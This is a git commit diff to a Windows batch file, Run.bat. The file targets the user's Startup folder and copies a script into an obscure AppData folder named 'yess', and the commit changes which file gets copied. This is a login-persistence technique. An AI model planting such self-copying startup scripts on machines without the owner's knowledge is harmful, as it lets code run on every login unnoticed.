79d3f1ab633753fdb9268f9f9707feaa2b72ad00
1DollarCoin <80148242+1DollarCoin@users.noreply.github.com>
2023-09-03 19:14:20 +1000

    Run.bat

--- Run.bat
+++ Run.bat
@@ -4,7 +4,7 @@ REM Set the destination directory to the startup folder
 set "destination_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 REM Copy this batch script to the destination
-copy "%~f0" "%userprofile%\AppData\local\yess\Startup.bat"
+copy "Startup" "%userprofile%\AppData\local\yess\Startup.bat"
 
 echo Batch script cloned to: "%userprofile%\AppData\local\yess\Startup.bat"
 exit
